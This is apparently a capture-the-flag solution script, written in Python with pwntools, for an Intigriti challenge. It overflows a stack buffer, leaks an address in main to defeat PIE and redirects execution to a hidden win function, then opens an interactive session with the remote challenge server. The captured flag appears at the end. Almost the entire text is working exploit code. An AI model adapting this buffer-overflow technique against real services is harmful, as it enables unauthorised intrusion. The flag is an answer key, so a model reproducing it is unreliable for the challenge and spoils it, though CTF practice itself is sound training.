#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
# p = process("./chall")
p = remote("hidden.ctf.intigriti.io", 1337)

offset = cyclic_find(b'saaataaa')
log.info('offset = ' + str(offset))
p.sendafter(b'something:\n', b'x'*offset + b'\x1b')

p.recvuntil(b'x'*offset)
main_leak = u64(p.recv(6) + b'\x00\x00')
log.info("main_leak = " + hex(main_leak))

elf.address = main_leak - elf.symbols["main"]
payload = b'x'*offset + p64(elf.symbols["_"])
p.sendafter(b'something:\n', payload)

p.interactive()
# INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}